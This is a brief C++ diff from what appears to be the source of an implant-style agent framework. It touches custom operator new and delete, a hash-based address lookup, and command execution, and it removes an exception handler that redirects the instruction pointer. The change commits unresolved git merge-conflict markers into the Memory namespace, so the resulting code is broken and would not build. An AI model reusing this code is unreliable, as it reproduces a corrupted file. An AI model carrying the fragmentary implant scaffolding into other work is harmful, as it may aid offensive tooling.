@@ -26,16 +26,19 @@ void operator delete(void* ptr) noexcept {
 }
 
 void* operator new[](size_t size) {
-    return ::operator new(size);
+    return operator new(size);
 }
 
 void operator delete[](void* ptr) noexcept {
-    ::operator delete(ptr);
+    operator delete(ptr);
 }
 
 
 namespace Memory {
+<<<<<<< HEAD
 
+=======
+>>>>>>> fa655a35da8994c5374e91fb02aad479e47a6ec9
     namespace Methods {
 
         UINT_PTR GetInternalAddress(uint32_t name) {
@@ -254,15 +257,6 @@ namespace Memory {
     }
 
     namespace Execute {
-
-        LONG WINAPI Debugger(EXCEPTION_POINTERS *exception) {
-            HEXANE
-
-            exception->ContextRecord->IP_REG = U_PTR(ExceptionReturn);
-            ntstatus = exception->ExceptionRecord->ExceptionCode;
-
-            return EXCEPTION_CONTINUE_EXECUTION;
-        }
 
         BOOL ExecuteCommand(_parser &parser) {
             HEXANE
